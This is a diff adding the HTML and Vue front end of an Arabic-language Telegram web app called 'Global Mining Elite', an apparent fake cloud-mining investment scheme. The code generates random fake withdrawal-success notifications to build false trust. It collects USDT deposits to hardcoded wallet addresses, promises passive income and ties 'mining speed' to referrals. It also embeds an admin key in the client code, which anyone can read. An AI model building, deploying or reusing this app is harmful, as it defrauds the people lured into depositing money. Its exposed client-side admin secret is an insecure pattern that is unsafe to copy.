@@ -1,0 +1,169 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <title>Global Mining Elite</title>
+    <script src="https://telegram.org/js/telegram-web-app.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/vue/3.3.4/vue.global.min.js"></script>
+    <link rel="stylesheet" href="https://fastly.jsdelivr.net/npm/vant@4/lib/index.css" />
+    <script src="https://fastly.jsdelivr.net/npm/vant@4/lib/vant.min.js"></script>
+    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" rel="stylesheet">
+    <style>
+        body { background: #050505; color: #fff; font-family: sans-serif; padding-bottom: 70px; }
+        .gold-text { background: linear-gradient(to right, #FFD700, #B8860B); -webkit-background-clip: text; -webkit-text-fill-color: transparent; font-weight: 900; }
+        .main-card { background: linear-gradient(145deg, #1a1a1a, #000); border: 1px solid #333; margin: 15px; border-radius: 20px; padding: 20px; text-align: center; }
+        .mining-btn { width: 150px; height: 150px; border-radius: 50%; border: 4px solid #FFD700; background: #111; position: relative; cursor: pointer; transition: 0.3s; margin: 20px auto; display: flex; align-items: center; justify-content: center; overflow: hidden; }
+        .nav-bar { position: fixed; bottom: 0; width: 100%; background: #000; border-top: 1px solid #333; display: flex; justify-content: space-around; padding: 10px 0; z-index: 100; }
+        .nav-item { color: #888; font-size: 12px; text-align: center; }
+        .nav-item.active { color: #FFD700; }
+        .wallet-display { background: #111; border: 1px dashed #FFD700; padding: 10px; border-radius: 5px; font-size: 10px; word-break: break-all; margin: 10px 0; color: #FFD700; }
+    </style>
+</head>
+<body>
+<div id="app">
+    <van-notice-bar left-icon="volume-o" background="#1a1a1a" color="#FFD700" :text="liveNotification"></van-notice-bar>
+
+    <div v-if="activeTab === 'home'">
+        <div class="main-card">
+            <div style="font-size: 14px; color: #aaa;">الرصيد القابل للسحب</div>
+            <div class="gold-text" style="font-size: 40px;">${{ user.balance.toFixed(4) }}</div>
+            <div style="margin-top: 10px;"><span class="gold-text">VIP {{ user.vip }}</span> | سرعة التعدين: {{ speedMultiplier }}x</div>
+        </div>
+        <div style="text-align: center;">
+            <div class="mining-btn" @click="mine">
+                <i class="fa-solid fa-microchip" style="font-size: 50px; color: #FFD700;"></i>
+            </div>
+            <p style="color: #888;">انقر لبدء التوليد الرقمي</p>
+        </div>
+        <div style="display: flex; gap: 10px; padding: 0 15px;">
+            <van-button block round color="#FFD700" @click="showDeposit=true"><span style="color:#000; font-weight:bold">إيداع</span></van-button>
+            <van-button block round plain color="#FFD700" @click="showWithdraw=true">سحب</van-button>
+        </div>
+    </div>
+
+    <div v-if="activeTab === 'about'" style="padding: 15px;">
+        <h2 class="gold-text">مؤسسة Global Mining</h2>
+        <p style="font-size: 13px; color: #aaa;">نحن منصة تعدين سحابية تهدف لتوفير دخل سلبي مستدام. نعتمد نظام سحب ذكي (20%) لضمان استمرار السيولة لجميع المستثمرين لفترات طويلة.</p>
+        <van-button block icon="chat-o" color="#0088cc" style="margin-top: 20px;">الدعم الفني</van-button>
+    </div>
+
+    <div v-if="isAdmin" style="margin: 15px; border: 1px solid red; padding: 10px;">
+        <h4 style="color:red">إدارة المستخدمين</h4>
+        <van-field v-model="targetId" placeholder="آيدي المستخدم"></van-field>
+        <van-field v-model="amountToAdd" placeholder="المبلغ" type="number"></van-field>
+        <van-button size="small" type="primary" block @click="adminAction('add_money')">شحن رصيد</van-button>
+        <van-button size="small" type="warning" block style="margin-top:5px;" @click="adminAction('set_vip')">تفعيل VIP 1</van-button>
+    </div>
+
+    <van-dialog v-model:show="showDeposit" title="إيداع آمن" show-cancel-button confirm-button-text="تأكيد" @confirm="confirmDeposit">
+        <div style="padding: 20px; color: #333;">
+            <label style="font-weight: bold; font-size: 12px;">اختر الشبكة لإظهار العنوان:</label>
+            <select v-model="net" style="width:100%; padding:10px; margin: 10px 0;">
+                <option value="TRC20">USDT (TRC20) 🧧</option>
+                <option value="BEP20">USDT (BEP20 / B2B) 🟡</option>
+            </select>
+            
+            <p style="font-size: 11px;">عنوان المحفظة الخاص بنا:</p>
+            <div class="wallet-display">
+                {{ net === 'TRC20' ? 'TEsCEHSkKwWTLLdEuGCHnpf23e8Sv3cZto' : '0x88bea8db94f9428f282b2cc375ec68ac67fd9200' }}
+            </div>
+            
+            <van-field v-model="tx" placeholder="أدخل رقم العملية TXID" label="TXID"></van-field>
+        </div>
+    </van-dialog>
+
+    <van-dialog v-model:show="showWithdraw" title="سحب الأرباح" show-cancel-button @confirm="requestWithdraw">
+        <div style="padding: 20px; color: #333;">
+            <van-field v-model="wAmt" type="number" label="المبلغ" placeholder="الحد الأدنى 2$"></van-field>
+            <van-field v-model="wAddr" label="محفظتك" placeholder="عنوانك الخاص"></van-field>
+        </div>
+    </van-dialog>
+
+    <div class="nav-bar">
+        <div class="nav-item" :class="{active: activeTab==='home'}" @click="activeTab='home'"><i class="fa-solid fa-house"></i><div>الرئيسية</div></div>
+        <div class="nav-item" :class="{active: activeTab==='about'}" @click="activeTab='about'"><i class="fa-solid fa-info-circle"></i><div>من نحن</div></div>
+    </div>
+</div>
+
+<script>
+    const { createApp, ref, onMounted, computed } = Vue;
+    const { showToast, showDialog } = vant;
+    const SERVER = "https://steep-resonance-6443.alaabdalaziz01.workers.dev";
+    const ADMIN_ID = "921301895";
+
+    createApp({
+        setup() {
+            const user = ref({ balance: 0, referralCount: 0, vip: 0 });
+            const activeTab = ref('home');
+            const userId = ref("");
+            const username = ref("");
+            const showDeposit = ref(false);
+            const showWithdraw = ref(false);
+            const net = ref("TRC20");
+            const tx = ref("");
+            const wAmt = ref("");
+            const wAddr = ref("");
+            const targetId = ref("");
+            const amountToAdd = ref("");
+            const liveNotification = ref("جاري معالجة السحوبات... العضو User***82 سحب 2$ بنجاح.");
+
+            const isAdmin = computed(() => userId.value.toString() === ADMIN_ID);
+            const speedMultiplier = computed(() => (1 + user.value.referralCount * 0.1).toFixed(1));
+
+            onMounted(async () => {
+                if (window.Telegram?.WebApp) {
+                    const tg = window.Telegram.WebApp;
+                    tg.expand();
+                    if (tg.initDataUnsafe?.user) {
+                        userId.value = tg.initDataUnsafe.user.id;
+                        username.value = tg.initDataUnsafe.user.first_name;
+                        await apiRequest('login', { referrerId: tg.initDataUnsafe.start_param });
+                    }
+                }
+                setInterval(() => {
+                    liveNotification.value = `تهنئة! العضو User***${Math.floor(Math.random()*100)} سحب ${Math.floor(Math.random()*10)+2}$ بنجاح.`;
+                }, 10000);
+            });
+
+            const apiRequest = async (action, data = {}) => {
+                try {
+                    const res = await fetch(SERVER, { method: 'POST', body: JSON.stringify({ action, userId: userId.value, username: username.value, ...data }) });
+                    const result = await res.json();
+                    if (result.error) { showToast(result.error); return null; }
+                    if (result.balance !== undefined) user.value = result;
+                    if (result.user) user.value = result.user;
+                    return result;
+                } catch (e) { showToast('خطأ اتصال'); }
+            };
+
+            const mine = () => {
+                if (window.Telegram.WebApp.HapticFeedback) window.Telegram.WebApp.HapticFeedback.impactOccurred('medium');
+                apiRequest('mine', { amount: 0.01 });
+            };
+
+            const confirmDeposit = async () => {
+                if(!tx.value) return showToast('أدخل TXID');
+                await apiRequest('request_deposit', { txId: tx.value, network: net.value });
+                showDialog({ message: 'تم إرسال الإشعار للإدارة! سيتم التحقق والشحن يدوياً ✅' });
+            };
+
+            const requestWithdraw = async () => {
+                const res = await apiRequest('request_withdraw', { amount: wAmt.value, wallet: wAddr.value, network: net.value });
+                if (res && res.success) showDialog({ message: 'تم استلام طلب السحب وسيصلك المال قريباً 💸' });
+            };
+
+            const adminAction = async (type) => {
+                let p = { adminKey: "MY_SECRET_KEY_123", userId: targetId.value };
+                if (type === 'add_money') p.addBalance = parseFloat(amountToAdd.value);
+                if (type === 'set_vip') p.setVip = 1;
+                await apiRequest('admin_update', p);
+                showToast('تم التحديث ✅');
+            };
+
+            return { user, activeTab, userId, username, isAdmin, speedMultiplier, showDeposit, showWithdraw, net, tx, wAmt, wAddr, targetId, amountToAdd, liveNotification, mine, confirmDeposit, requestWithdraw, adminAction };
+        }
+    }).use(vant).mount('#app');
+</script>
+</body>
+</html>
